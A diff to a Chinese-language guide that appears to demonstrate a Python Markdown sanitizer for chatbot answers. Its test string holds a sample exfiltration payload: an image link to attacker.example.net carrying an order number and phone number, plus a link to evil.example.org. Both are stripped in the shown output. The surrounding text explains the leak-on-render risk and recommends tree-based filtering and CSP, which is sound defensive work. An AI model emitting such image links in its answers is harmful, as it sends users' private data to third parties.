@@ -260,14 +260,16 @@ def sanitize(markdown: str) -> str:
     return MARKDOWN_LINK.sub(replace, markdown)
 
 
-answer = ("退货流程见 [帮助中心](https://docs.example.com/refund)。"
-          "![状态](https://attacker.example.net/p.png?d=order-A1024-phone-13800000000)"
-          " 更多信息请看 [这里](https://evil.example.org/login)。")
+answer = ("退货流程见 [帮助中心](https://docs.example.com/refund)。\n"
+          "![状态](https://attacker.example.net/p.png?d=A1024-13800000000)\n"
+          "更多见 [这里](https://evil.example.org/login)。")
 print(sanitize(answer))
 ```
 
 ```text title="运行输出（Python 3.12，只用标准库）"
-退货流程见 [帮助中心](https://docs.example.com/refund)。[已移除外部图片] 更多信息请看 这里（链接已移除：evil.example.org）。
+退货流程见 [帮助中心](https://docs.example.com/refund)。
+[已移除外部图片]
+更多见 这里（链接已移除：evil.example.org）。
 ```
 
 白名单内的帮助中心链接原样保留；带着订单号和手机号的外部图片被拿掉，它本来会在渲染的一瞬间把数据发给第三方；另一个外部链接降级成文字。正则只覆盖标准的 Markdown 写法，生产环境应在 Markdown 解析成语法树之后过滤，并配上浏览器的 CSP 作为第二道。
